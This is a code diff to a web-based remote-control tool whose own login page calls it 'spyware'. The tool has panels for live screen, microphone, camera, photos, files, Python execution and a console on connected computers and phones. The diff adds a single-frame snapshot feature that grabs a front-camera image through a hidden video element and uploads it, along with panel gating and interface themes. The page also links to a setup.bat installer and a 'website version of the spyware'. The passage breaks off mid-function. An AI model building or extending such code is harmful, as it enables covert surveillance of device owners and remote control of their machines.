@@ -72,6 +72,7 @@ streams = {}
 stream_viewers = {}
 mic_streams = {}
 camera_streams = {}
+camera_snapshots = {}
 console_commands = {}
 python_requests = {}
 listing_requests = {}
@@ -86,12 +87,65 @@ lock = threading.Lock()
 website_sessions = {}
 blocked_sessions = {}
 site_effects = {}
-site_effects_global = {}
+site_effects_global = {"theme": "hacker"}
 session_lock = threading.Lock()
 WEBSITE_SESSION_LIMIT = 100
 WEBSITE_SESSION_MAX_AGE = 7 * 24 * 3600
+WEBSITE_IDLE_SECONDS = 900
 BLOCK_SECONDS = 60
 MAX_BLOCK_SECONDS = 86400
+
+HISTORY_SECONDS = 7 * 24 * 3600
+HISTORY_LIMIT = 5000
+website_history = deque(maxlen=HISTORY_LIMIT)
+device_history = deque(maxlen=HISTORY_LIMIT)
+help_stage = {}
+
+PANELS = (
+    "live",
+    "screenshot",
+    "stream",
+    "mic",
+    "camera",
+    "photos",
+    "python",
+    "files",
+    "downloader",
+    "console",
+)
+
+PANEL_ALIASES = {
+    "console": "console",
+    "cmd": "console",
+    "terminal": "console",
+    "live": "live",
+    "live-screen": "live",
+    "livescreen": "live",
+    "screen": "live",
+    "screenshot": "screenshot",
+    "screenshots": "screenshot",
+    "stream": "stream",
+    "screen-share": "stream",
+    "screenshare": "stream",
+    "share": "stream",
+    "mic": "mic",
+    "microphone": "mic",
+    "audio": "mic",
+    "camera": "camera",
+    "cam": "camera",
+    "webcam": "camera",
+    "photos": "photos",
+    "pictures": "photos",
+    "photo": "photos",
+    "python": "python",
+    "files": "files",
+    "file": "files",
+    "downloader": "downloader",
+    "download": "downloader",
+    "downloads": "downloader",
+}
+
+enabled_panels = {"console"}
 
 SITE_THEMES = (
     "pink",
@@ -103,6 +157,7 @@ SITE_THEMES = (
     "dark",
     "light",
     "mono",
+    "hacker",
 )
 
 SITE_EFFECTS = (
@@ -115,6 +170,7 @@ SITE_EFFECTS = (
     "caps",
     "spin",
     "invert",
+    "design",
 )
 
 NAME_REUSE_SECONDS = 90
@@ -365,7 +421,11 @@ def allocate_client_name(computer_name, now):
 
 def remove_client(name):
 
-    clients.pop(name, None)
+    client = clients.pop(name, None)
+
+    if client is not None and client.get("last_seen"):
+        record_device_offline(name, client["last_seen"])
+
     client_actions.pop(name, None)
     streams.pop(name, None)
     stream_viewers.pop(name, None)
@@ -2074,6 +2134,174 @@ HTML = r"""
         html.theme-dark { filter: brightness(0.68); }
         html.theme-light { filter: invert(1) hue-rotate(180deg); }
         html.theme-mono { filter: grayscale(1); }
+        html.theme-hacker {
+            filter: hue-rotate(95deg) saturate(1.75) brightness(0.72) contrast(1.3);
+        }
+
+        /* ---------- NO-DESIGN MODE (design command, default off) ---------- */
+
+        /* Design off means a bare HTML page: no author colors, so the
+           browser supplies its own defaults. Everything starts at the
+           top left. */
+
+        html.plain-ui {
+            filter: none !important;
+        }
+
+        html.plain-ui body,
+        html.plain-ui body * {
+            background-color: revert !important;
+            background-image: none !important;
+            color: revert !important;
+            border-color: revert !important;
+            border-radius: 0 !important;
+            box-shadow: none !important;
+            text-shadow: none !important;
+            backdrop-filter: none !important;
+            filter: none !important;
+            animation: none !important;
+            transition: none !important;
+            font-family: revert !important;
+            letter-spacing: normal !important;
+            text-transform: none !important;
+        }
+
+        html.plain-ui body {
+            margin: 8px !important;
+            padding: 0 !important;
+        }
+
+        html.plain-ui *::before,
+        html.plain-ui *::after {
+            content: none !important;
+            display: none !important;
+        }
+
+        html.plain-ui .app-shell,
+        html.plain-ui .connect-shell {
+            display: block !important;
+            gap: 0 !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .connect-view,
+        html.plain-ui .connect-card {
+            display: block !important;
+            min-height: 0 !important;
+            width: auto !important;
+            max-width: none !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            border: 0 !important;
+            background: transparent !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .sidebar {
+            position: static !important;
+            display: block !important;
+            width: auto !important;
+            height: auto !important;
+            max-height: none !important;
+            padding: 0 !important;
+            margin: 0 0 8px !important;
+            border: 0 !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .sidebar-brand,
+        html.plain-ui .nav-label {
+            display: none !important;
+        }
+
+        html.plain-ui .function-nav,
+        html.plain-ui .sidebar-bottom,
+        html.plain-ui .nav-list {
+            display: block !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            border: 0 !important;
+            list-style: none !important;
+        }
+
+        html.plain-ui .nav-list li {
+            display: inline !important;
+            margin: 0 !important;
+            padding: 0 !important;
+        }
+
+        html.plain-ui .nav-item {
+            display: inline !important;
+            width: auto !important;
+            margin: 0 10px 0 0 !important;
+            padding: 0 !important;
+            border: 0 !important;
+            background: none !important;
+            color: LinkText !important;
+            font: inherit !important;
+            text-decoration: underline !important;
+        }
+
+        html.plain-ui .nav-item.active {
+            color: VisitedText !important;
+            font-weight: normal !important;
+        }
+
+        html.plain-ui .main {
+            display: block !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            border: 0 !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .main-head {
+            display: block !important;
+            padding: 0 !important;
+            margin: 0 0 8px !important;
+            border: 0 !important;
+        }
+
+        html.plain-ui .main-head h1 {
+            display: inline !important;
+            margin: 0 8px 0 0 !important;
+            padding: 0 !important;
+            font-size: 2em !important;
+            font-weight: bold !important;
+        }
+
+        html.plain-ui .main-head-right {
+            display: inline !important;
+            margin: 0 !important;
+            padding: 0 !important;
+        }
+
+        html.plain-ui .panel,
+        html.plain-ui .view {
+            padding: 0 !important;
+            margin: 0 !important;
+            border: 0 !important;
+        }
+
+        html.plain-ui button,
+        html.plain-ui input,
+        html.plain-ui textarea,
+        html.plain-ui select {
+            padding: 1px 4px !important;
+            font: inherit !important;
+        }
+
+        html.plain-ui img,
+        html.plain-ui video,
+        html.plain-ui canvas {
+            background: transparent !important;
+        }
+
+        html.plain-ui body [hidden] {
+            display: none !important;
+        }
 
         html.fx-mirror { transform: scaleX(-1); }
 
@@ -2198,7 +2426,7 @@ HTML = r"""
         <nav class="function-nav">
             <p class="nav-label">Functions</p>
             <ul class="nav-list" id="functionList">
-                <li><button class="nav-item active" data-panel="live" onclick="selectPanel('live')">Live Screen</button></li>
+                <li><button class="nav-item" data-panel="live" onclick="selectPanel('live')">Live Screen</button></li>
                 <li><button class="nav-item" data-panel="screenshot" onclick="selectPanel('screenshot')">Screenshot</button></li>
                 <li><button class="nav-item" data-panel="stream" onclick="selectPanel('stream')">Screen Share</button></li>
                 <li><button class="nav-item" data-panel="mic" onclick="selectPanel('mic')">Microphone</button></li>
@@ -2207,7 +2435,7 @@ HTML = r"""
                 <li><button class="nav-item" data-panel="python" onclick="selectPanel('python')">Python</button></li>
                 <li><button class="nav-item" data-panel="files" onclick="selectPanel('files')">Files</button></li>
                 <li><button class="nav-item" data-panel="downloader" onclick="selectPanel('downloader')">Downloader</button></li>
-                <li><button class="nav-item" data-panel="console" onclick="selectPanel('console')">Console</button></li>
+                <li><button class="nav-item active" data-panel="console" onclick="selectPanel('console')">Console</button></li>
             </ul>
         </nav>
 
@@ -2433,9 +2661,14 @@ HTML = r"""
 <section class="panel view" data-view="camera" hidden>
 
     <div class="panel-header">
-        <button id="cameraButton" onclick="toggleCamera()">
-            Start Camera
-        </button>
+        <div class="row">
+            <button id="cameraButton" onclick="toggleCamera()">
+                Start Camera
+            </button>
+            <button id="cameraSnapshotButton" class="ghost" onclick="captureCameraFrame()">
+                Single Frame
+            </button>
+        </div>
     </div>
 
     <p id="cameraStatus" class="muted">
@@ -2450,6 +2683,10 @@ HTML = r"""
         <figure>
             <img id="cameraImageFront" alt="Front camera" style="display:none;">
             <figcaption>Front camera</figcaption>
+        </figure>
+        <figure>
+            <img id="cameraSnapshotImage" alt="Single frame" style="display:none;">
+            <figcaption>Single frame</figcaption>
         </figure>
     </div>
 
@@ -3178,8 +3415,8 @@ function showHomeView(name) {
 
 function selectPanel(name) {
 
-    if (!VIEW_TITLES[name]) {
-        name = "live";
+    if (!VIEW_TITLES[name] || !panelEnabled(name)) {
+        name = "console";
     }
 
     document.getElementById("viewTitle").textContent = VIEW_TITLES[name];
@@ -3224,6 +3461,7 @@ async function disconnectComputer(reason) {
     }
 
     liveScreenReset();
+    resetSnapshot();
 
     currentComputer = "";
     currentTree = null;
@@ -3288,7 +3526,7 @@ async function disconnectComputer(reason) {
     document.getElementById("cameraStatus").textContent =
         "Camera is off.";
 
-    selectPanel("live");
+    selectPanel("console");
     showConnectView();
 
     if (gone) {
@@ -3312,7 +3550,7 @@ async function disconnectComputer(reason) {
 
 const SITE_THEME_NAMES = [
     "pink", "green", "purple", "red", "blue",
-    "yellow", "dark", "light", "mono"
+    "yellow", "dark", "light", "mono", "hacker"
 ];
 
 const SITE_EFFECT_NAMES = [
@@ -3334,11 +3572,68 @@ function applySiteEffects(effects) {
         );
     }
 
+    // The design command defaults to off, so an absent flag means plain.
+    document.documentElement.classList.toggle(
+        "plain-ui",
+        !effects.design
+    );
+
     for (const name of SITE_EFFECT_NAMES) {
         document.body.classList.toggle(
             "fx-" + name,
             Boolean(effects[name])
         );
+    }
+}
+
+
+const PANEL_NAMES = [
+    "live", "screenshot", "stream", "mic", "camera",
+    "photos", "python", "files", "downloader", "console"
+];
+
+let enabledPanels = [];
+
+function panelEnabled(name) {
+
+    return name === "console" || enabledPanels.includes(name);
+}
+
+
+function defaultPanel() {
+
+    const preferred = currentKind === "mobile" ? "camera" : "live";
+
+    return panelEnabled(preferred) ? preferred : "console";
+}
+
+
+function applyPanelAccess(panels) {
+
+    if (Array.isArray(panels)) {
+        enabledPanels = panels.filter(
+            name => PANEL_NAMES.includes(name) && name !== "console"
+        );
+    }
+
+    const mobile = currentKind === "mobile";
+
+    document.querySelectorAll(".nav-item").forEach(item => {
+
+        const panel = item.dataset.panel;
+
+        const restricted = mobile
+            ? DESKTOP_ONLY_PANELS.includes(panel)
+            : MOBILE_ONLY_PANELS.includes(panel);
+
+        item.closest("li").hidden =
+            restricted || !panelEnabled(panel);
+    });
+
+    const active = document.querySelector(".nav-item.active");
+
+    if (active && active.closest("li").hidden) {
+        selectPanel(defaultPanel());
     }
 }
 
@@ -3353,6 +3648,8 @@ async function refreshComputers() {
         deviceList = data.clients || [];
 
         applySiteEffects(data.effects);
+
+        applyPanelAccess(data.panels);
 
         renderComputerOptions();
 
@@ -3437,25 +3734,16 @@ function applyDashboardMode(kind) {
 
     const mobile = kind === "mobile";
 
-    document.querySelectorAll(".nav-item").forEach(item => {
-
-        const panel = item.dataset.panel;
-        const hide = mobile
-            ? DESKTOP_ONLY_PANELS.includes(panel)
-            : MOBILE_ONLY_PANELS.includes(panel);
-
-        item.closest("li").hidden = hide;
-    });
-
     document.getElementById("sidebarSub").textContent =
         mobile ? "Mobile web device" : "Connected";
 
+    applyPanelAccess();
+
     if (mobile) {
-        selectPanel("camera");
         loadPhotos();
-    } else {
-        selectPanel("live");
     }
+
+    selectPanel(defaultPanel());
 }
 
 
@@ -3478,6 +3766,7 @@ async function connectComputer() {
     }
 
     liveScreenReset();
+    resetSnapshot();
 
     const select = document.getElementById("computerSelect");
     const selectedOption = select.selectedOptions[0];
@@ -4184,6 +4473,10 @@ async function runConsoleCommand() {
 
         consoleSetBusy(false);
         consolePrint("", "console-muted");
+
+        // Panel and website commands change shared state, so pick it
+        // up right away instead of waiting for the next poll.
+        refreshComputers();
 
         if (!input.disabled) {
             input.focus();
@@ -5669,6 +5962,9 @@ let cameraObjectUrls = {
     front: null
 };
 
+let snapshotBusy = false;
+let snapshotObjectUrl = null;
+
 
 function cameraFeed(camera) {
     return camera === "front"
@@ -5683,6 +5979,141 @@ function revokeCameraFrames() {
             URL.revokeObjectURL(cameraObjectUrls[camera]);
             cameraObjectUrls[camera] = null;
         }
+    }
+}
+
+
+function resetSnapshot() {
+
+    const image = document.getElementById("cameraSnapshotImage");
+
+    if (image) {
+        image.style.display = "none";
+        image.removeAttribute("src");
+    }
+
+    if (snapshotObjectUrl) {
+        URL.revokeObjectURL(snapshotObjectUrl);
+        snapshotObjectUrl = null;
+    }
+}
+
+
+async function captureCameraFrame() {
+
+    if (!currentComputer) {
+        showToast("Connect to a computer first.", "error", "No computer selected");
+        return;
+    }
+
+    if (snapshotBusy) {
+        return;
+    }
+
+    const target = currentComputer;
+    const button = document.getElementById("cameraSnapshotButton");
+
+    snapshotBusy = true;
+    button.disabled = true;
+
+    try {
+
+        const response = await api("/api/camera/snapshot", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                name: target
+            })
+        });
+
+        const request = await response.json();
+
+        let frame = null;
+
+        if (request.immediate) {
+
+            frame = await fetch(
+                "/api/camera/frame/" +
+                encodeURIComponent(target) +
+                "?camera=back&t=" + Date.now(),
+                { cache: "no-store" }
+            );
+
+        } else {
+
+            const deadline = Date.now() + 15000;
+
+            while (Date.now() < deadline) {
+
+                frame = await fetch(
+                    "/api/camera/snapshot/" +
+                    encodeURIComponent(request.request_id) +
+                    "?t=" + Date.now(),
+                    { cache: "no-store" }
+                );
+
+                if (frame.status !== 202) {
+                    break;
+                }
+
+                await new Promise(resolve => setTimeout(resolve, 400));
+            }
+        }
+
+        if (!frame || !frame.ok) {
+
+            let message = "The camera did not send a frame.";
+
+            if (frame) {
+                try {
+                    const data = await frame.json();
+                    message = data.error || message;
+                } catch {}
+            }
+
+            throw new Error(message);
+        }
+
+        const blob = await frame.blob();
+
+        if (target !== currentComputer) {
+            return;
+        }
+
+        const image = document.getElementById("cameraSnapshotImage");
+
+        if (snapshotObjectUrl) {
+            URL.revokeObjectURL(snapshotObjectUrl);
+        }
+
+        snapshotObjectUrl = URL.createObjectURL(blob);
+        image.src = snapshotObjectUrl;
+        image.style.display = "block";
+
+        logEvent(
+            "success",
+            "Captured a single camera frame from " + target + "."
+        );
+
+    } catch (error) {
+
+        showToast(
+            error.message,
+            "error",
+            "Camera snapshot failed"
+        );
+
+        logEvent(
+            "warn",
+            "Camera snapshot failed: " + error.message
+        );
+
+    } finally {
+
+        snapshotBusy = false;
+        button.disabled = false;
     }
 }
 
@@ -5762,6 +6193,7 @@ function finishCameraStop(message) {
     cameraFeed("front").style.display = "none";
 
     revokeCameraFrames();
+    resetSnapshot();
 
     showToast(
         message,
@@ -5786,6 +6218,7 @@ async function stopCamera() {
     cameraFeed("front").style.display = "none";
 
     revokeCameraFrames();
+    resetSnapshot();
 
     if (!currentComputer) {
         return;
@@ -6486,313 +6919,23 @@ LOGIN_HTML = r"""
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="utf-8">
     <title>spyware</title>
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            min-height: 100vh;
-            display: grid;
-            place-items: center;
-            padding: 24px;
-            background:
-                radial-gradient(circle at 50% 22%, #2a0f22 0%, #180d14 62%);
-            color: #f7dbe8;
-            font-family: Consolas, monospace;
-        }
-
-        .card {
-            position: relative;
-            width: 100%;
-            max-width: 400px;
-            padding: 34px 32px 28px;
-            background: rgba(26, 12, 20, 0.94);
-            border: 1px solid #4a2140;
-            border-radius: 16px;
-            box-shadow:
-                0 30px 90px rgba(0, 0, 0, 0.75),
-                0 0 40px rgba(217, 72, 143, 0.08);
-            backdrop-filter: blur(14px);
-            overflow: hidden;
-            animation: card-in 520ms cubic-bezier(0.2, 0.9, 0.3, 1.1) both;
-        }
-
-        .card::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 16%;
-            right: 16%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, #ff7ab8, transparent);
-            opacity: 0.55;
-        }
-
-        .mark {
-            position: relative;
-            width: 48px;
-            height: 48px;
-            margin: 0 auto 20px;
-            display: grid;
-            place-items: center;
-            border: 1px solid #4a2140;
-            border-radius: 50%;
-        }
-
-        .mark::before {
-            content: "";
-            width: 13px;
-            height: 13px;
-            border-radius: 50%;
-            background: #ff7ab8;
-            box-shadow: 0 0 20px #ff7ab8;
-            animation: breathe 2.4s ease-in-out infinite;
-        }
-
-        .mark::after {
-            content: "";
-            position: absolute;
-            inset: -6px;
-            border-radius: 50%;
-            border: 1px dashed #4a2140;
-            animation: spin 20s linear infinite;
-        }
-
-        h1 {
-            margin: 0 0 6px;
-            text-align: center;
-            font-size: 19px;
-            letter-spacing: 1.4px;
-            color: #ff9ecb;
-        }
-
-        .sub {
-            margin: 0 0 26px;
-            text-align: center;
-            font-size: 12px;
-            color: #b98fa8;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 7px;
-            font-size: 10px;
-            letter-spacing: 1.4px;
-            text-transform: uppercase;
-            color: #b98fa8;
-        }
-
-        .field {
-            margin-bottom: 16px;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px 13px;
-            background: #1c0c17;
-            border: 1px solid #4a2140;
-            border-radius: 8px;
-            color: #fbe4ef;
-            font-family: Consolas, monospace;
-            font-size: 14px;
-            transition:
-                border-color 160ms ease,
-                box-shadow 160ms ease,
-                background 160ms ease;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #ff77b9;
-            background: #24101d;
-            box-shadow: 0 0 0 3px rgba(217, 72, 143, 0.22);
-        }
-
-        .password-wrap {
-            position: relative;
-        }
-
-        .password-wrap input {
-            padding-right: 72px;
-        }
-
-        .reveal {
-            position: absolute;
-            top: 50%;
-            right: 6px;
-            transform: translateY(-50%);
-            padding: 6px 8px;
-            background: transparent;
-            border: none;
-            border-radius: 5px;
-            color: #b98fa8;
-            font-family: Consolas, monospace;
-            font-size: 10px;
-            letter-spacing: 0.8px;
-            text-transform: uppercase;
-            cursor: pointer;
-        }
-
-        .reveal:hover {
-            color: #f7dbe8;
-            background: #3a1a30;
-        }
-
-        .error {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 16px;
-            padding: 10px 12px;
-            background: rgba(255, 95, 126, 0.08);
-            border: 1px solid rgba(255, 95, 126, 0.35);
-            border-radius: 8px;
-            color: #ffb3c9;
-            font-size: 12px;
-            animation:
-                shake 420ms ease,
-                fade-in 240ms ease;
-        }
-
-        .error::before {
-            content: "";
-            flex: 0 0 auto;
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: #ff5f7e;
-            box-shadow: 0 0 10px #ff5f7e;
-        }
-
-        button[type="submit"] {
-            width: 100%;
-            padding: 12px;
-            background: #c93b86;
-            border: none;
-            border-radius: 8px;
-            color: #fff4f9;
-            font-family: Consolas, monospace;
-            font-size: 13px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition:
-                background 160ms ease,
-                transform 160ms ease,
-                box-shadow 160ms ease;
-        }
-
-        button[type="submit"]:hover {
-            background: #d9488f;
-            transform: translateY(-1px);
-            box-shadow: 0 10px 24px rgba(217, 72, 143, 0.3);
-        }
-
-        button[type="submit"]:active {
-            transform: translateY(0);
-        }
-
-        button[type="submit"]:disabled {
-            opacity: 0.55;
-            cursor: wait;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .alt-links {
-            margin-top: 14px;
-            text-align: center;
-        }
-
-        .alt-link {
-            display: block;
-            color: #ff9ecb;
-            font-size: 11px;
-            letter-spacing: 0.6px;
-            text-decoration: underline;
-            text-underline-offset: 3px;
-            transition: color 160ms ease;
-        }
-
-        .alt-link + .alt-link {
-            margin-top: 10px;
-        }
-
-        .alt-link:hover {
-            color: #f7dbe8;
-        }
-
-        .footer {
-            margin: 18px 0 0;
-            text-align: center;
-            font-size: 10px;
-            letter-spacing: 0.8px;
-            color: #8a5577;
-        }
-
-        @keyframes card-in {
-            from {
-                opacity: 0;
-                transform: translateY(14px) scale(0.98);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        @keyframes breathe {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.45; transform: scale(0.8); }
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-6px); }
-            50% { transform: translateX(5px); }
-            75% { transform: translateX(-3px); }
-        }
-
-        @keyframes fade-in {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-    </style>
 </head>
-
 <body>
 
-<form class="card" id="loginForm" method="post" action="/login">
-
-    <div class="mark"></div>
-
-    <h1>Remote Computer Manager</h1>
-    <p class="sub">
-        {% if mobile_next %}
-        Sign in to use the mobile version on this phone
-        {% else %}
-        Sign in to open the dashboard
-        {% endif %}
-    </p>
-
-    {% if error %}
-    <div class="error">{{ error }}</div>
-    {% endif %}
+<form method="post" action="/login">
 
     <input type="hidden" name="next" value="{{ next_url }}">
 
-    <div class="field">
-        <label for="username">Username</label>
+    {% if error %}
+    <p class="error">{{ error }}</p>
+    {% endif %}
+
+    <p>
+        username:
         <input
             id="username"
             name="username"
@@ -6802,89 +6945,32 @@ LOGIN_HTML = r"""
             spellcheck="false"
             autofocus
         >
-    </div>
+    </p>
 
-    <div class="field">
-        <label for="password">Password</label>
-
-        <div class="password-wrap">
-            <input
-                id="password"
-                name="password"
-                type="password"
-                autocomplete="current-password"
-                {% if error %}autofocus{% endif %}
-            >
-
-            <button
-                class="reveal"
-                id="reveal"
-                type="button"
-                aria-label="Show password"
-            >
-                Show
-            </button>
-        </div>
-    </div>
-
-    <button type="submit" id="submitButton">
-        Sign In
-    </button>
-
-    <div class="alt-links">
-
-        <a
-            class="alt-link"
-            href="https://github.com/downloader-AXP/downloader/releases/latest/download/setup.bat"
-            target="_blank"
-            rel="noopener noreferrer"
-            aria-label="Download the latest setup.bat from GitHub"
+    <p>
+        password:
+        <input
+            id="password"
+            name="password"
+            type="password"
+            autocomplete="current-password"
         >
+        <button type="submit">sign in</button>
+    </p>
+
+    <p>
+        <a href="https://github.com/downloader-AXP/downloader/releases/latest/download/setup.bat">
             download instead
         </a>
+    </p>
 
-        {% if mobile_next %}
-        <a class="alt-link" href="/login">
-            back to dashboard sign-in
+    <p>
+        <a href="/website-version{% if mobile_next %}?next=%2Fmobile{% endif %}">
+            website version of the spyware
         </a>
-        {% else %}
-        <a class="alt-link" href="/mobile">
-            use website version spyware for mobile users
-        </a>
-        {% endif %}
-
-    </div>
-
-    <p class="footer">Authorized access only.</p>
+    </p>
 
 </form>
-
-<script>
-    const form = document.getElementById("loginForm");
-    const password = document.getElementById("password");
-    const reveal = document.getElementById("reveal");
-    const submitButton = document.getElementById("submitButton");
-
-    reveal.addEventListener("click", () => {
-
-        const showing = password.type === "text";
-
-        password.type = showing ? "password" : "text";
-        reveal.textContent = showing ? "Show" : "Hide";
-        reveal.setAttribute(
-            "aria-label",
-            showing ? "Show password" : "Hide password"
-        );
-
-        password.focus();
-    });
-
-    form.addEventListener("submit", () => {
-
-        submitButton.disabled = true;
-        submitButton.textContent = "Signing In...";
-    });
-</script>
 
 </body>
 </html>
@@ -7142,6 +7228,174 @@ MOBILE_HTML = r"""
         html.theme-dark { filter: brightness(0.68); }
         html.theme-light { filter: invert(1) hue-rotate(180deg); }
         html.theme-mono { filter: grayscale(1); }
+        html.theme-hacker {
+            filter: hue-rotate(95deg) saturate(1.75) brightness(0.72) contrast(1.3);
+        }
+
+        /* ---------- NO-DESIGN MODE (design command, default off) ---------- */
+
+        /* Design off means a bare HTML page: no author colors, so the
+           browser supplies its own defaults. Everything starts at the
+           top left. */
+
+        html.plain-ui {
+            filter: none !important;
+        }
+
+        html.plain-ui body,
+        html.plain-ui body * {
+            background-color: revert !important;
+            background-image: none !important;
+            color: revert !important;
+            border-color: revert !important;
+            border-radius: 0 !important;
+            box-shadow: none !important;
+            text-shadow: none !important;
+            backdrop-filter: none !important;
+            filter: none !important;
+            animation: none !important;
+            transition: none !important;
+            font-family: revert !important;
+            letter-spacing: normal !important;
+            text-transform: none !important;
+        }
+
+        html.plain-ui body {
+            margin: 8px !important;
+            padding: 0 !important;
+        }
+
+        html.plain-ui *::before,
+        html.plain-ui *::after {
+            content: none !important;
+            display: none !important;
+        }
+
+        html.plain-ui .app-shell,
+        html.plain-ui .connect-shell {
+            display: block !important;
+            gap: 0 !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .connect-view,
+        html.plain-ui .connect-card {
+            display: block !important;
+            min-height: 0 !important;
+            width: auto !important;
+            max-width: none !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            border: 0 !important;
+            background: transparent !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .sidebar {
+            position: static !important;
+            display: block !important;
+            width: auto !important;
+            height: auto !important;
+            max-height: none !important;
+            padding: 0 !important;
+            margin: 0 0 8px !important;
+            border: 0 !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .sidebar-brand,
+        html.plain-ui .nav-label {
+            display: none !important;
+        }
+
+        html.plain-ui .function-nav,
+        html.plain-ui .sidebar-bottom,
+        html.plain-ui .nav-list {
+            display: block !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            border: 0 !important;
+            list-style: none !important;
+        }
+
+        html.plain-ui .nav-list li {
+            display: inline !important;
+            margin: 0 !important;
+            padding: 0 !important;
+        }
+
+        html.plain-ui .nav-item {
+            display: inline !important;
+            width: auto !important;
+            margin: 0 10px 0 0 !important;
+            padding: 0 !important;
+            border: 0 !important;
+            background: none !important;
+            color: LinkText !important;
+            font: inherit !important;
+            text-decoration: underline !important;
+        }
+
+        html.plain-ui .nav-item.active {
+            color: VisitedText !important;
+            font-weight: normal !important;
+        }
+
+        html.plain-ui .main {
+            display: block !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            border: 0 !important;
+            overflow: visible !important;
+        }
+
+        html.plain-ui .main-head {
+            display: block !important;
+            padding: 0 !important;
+            margin: 0 0 8px !important;
+            border: 0 !important;
+        }
+
+        html.plain-ui .main-head h1 {
+            display: inline !important;
+            margin: 0 8px 0 0 !important;
+            padding: 0 !important;
+            font-size: 2em !important;
+            font-weight: bold !important;
+        }
+
+        html.plain-ui .main-head-right {
+            display: inline !important;
+            margin: 0 !important;
+            padding: 0 !important;
+        }
+
+        html.plain-ui .panel,
+        html.plain-ui .view {
+            padding: 0 !important;
+            margin: 0 !important;
+            border: 0 !important;
+        }
+
+        html.plain-ui button,
+        html.plain-ui input,
+        html.plain-ui textarea,
+        html.plain-ui select {
+            padding: 1px 4px !important;
+            font: inherit !important;
+        }
+
+        html.plain-ui img,
+        html.plain-ui video,
+        html.plain-ui canvas {
+            background: transparent !important;
+        }
+
+        html.plain-ui body [hidden] {
+            display: none !important;
+        }
 
         html.fx-mirror { transform: scaleX(-1); }
 
@@ -7285,7 +7539,7 @@ function logLine(text, cls) {
 
 const SITE_THEME_NAMES = [
     "pink", "green", "purple", "red", "blue",
-    "yellow", "dark", "light", "mono"
+    "yellow", "dark", "light", "mono", "hacker"
 ];
 
 const SITE_EFFECT_NAMES = [
@@ -7306,6 +7560,12 @@ function applySiteEffects(effects) {
             theme === name
         );
     }
+
+    // The design command defaults to off, so an absent flag means plain.
+    document.documentElement.classList.toggle(
+        "plain-ui",
+        !effects.design
+    );
 
     for (const name of SITE_EFFECT_NAMES) {
         document.body.classList.toggle(
@@ -7555,6 +7815,106 @@ function uploadFrame(blob, camera) {
 }
 
 
+let snapshotBusy = false;
+
+
+async function sendSingleFrame(requestId) {
+
+    if (!requestId || !deviceName || snapshotBusy) {
+        return;
+    }
+
+    snapshotBusy = true;
+
+    let temporary = null;
+    const video = document.createElement("video");
+    video.className = "ghost-media";
+    video.muted = true;
+    video.playsInline = true;
+    document.body.appendChild(video);
+
+    try {
+
+        const live = (
+            cameraStreams.front && cameraVideos.front.videoWidth
+        ) ? cameraStreams.front : null;
+
+        if (!live) {
+            temporary = await getCameraStream("user");
+        }
+
+        video.srcObject = live || temporary;
+        await video.play().catch(() => {});
+
+        await new Promise(resolve => setTimeout(resolve, 450));
+
+        const width = Math.min(960, video.videoWidth || 0);
+
+        if (!width) {
+            throw new Error("Camera frame is not ready.");
+        }
+
+        const height = Math.round(
+            video.videoHeight * (width / video.videoWidth)
+        );
+
+        const canvas = document.createElement("canvas");
+        canvas.width = width;
+        canvas.height = height;
+        canvas.getContext("2d").drawImage(video, 0, 0, width, height);
+
+        const blob = await new Promise(
+            resolve => canvas.toBlob(resolve, "image/jpeg", 0.8)
+        );
+
+        if (!blob) {
+            throw new Error("Could not encode the frame.");
+        }
+
+        const form = new FormData();
+        form.append("name", deviceName);
+        form.append("request_id", requestId);
+        form.append("frame", blob, "frame.jpg");
+
+        const response = await fetch(
+            "/upload-camera-snapshot",
+            { method: "POST", body: form }
+        );
+
+        if (authRedirect(response)) return;
+
+        if (!response.ok) {
+            throw new Error("Upload failed (" + response.status + ").");
+        }
+
+        logLine("> single camera frame sent", "dim");
+
+    } catch (error) {
+
+        logLine("! single camera frame failed: " + error.message, "err");
+
+        const form = new FormData();
+        form.append("name", deviceName);
+        form.append("request_id", requestId);
+        form.append("error", String(error.message || error).slice(0, 500));
+        fetch(
+            "/upload-camera-snapshot",
+            { method: "POST", body: form }
+        ).catch(() => {});
+
+    } finally {
+
+        if (temporary) {
+            temporary.getTracks().forEach(track => track.stop());
+        }
+
+        video.srcObject = null;
+        video.remove();
+        snapshotBusy = false;
+    }
+}
+
+
 function cameraLoop() {
     cameraTimer = null;
     if (!cameraActive) return;
@@ -7648,6 +8008,10 @@ async function pollState() {
                 setMicActive(Boolean(data.microphone));
                 requestBanner.hidden = !data.photo_request;
                 applySiteEffects(data.effects);
+
+                if (data.snapshot_request) {
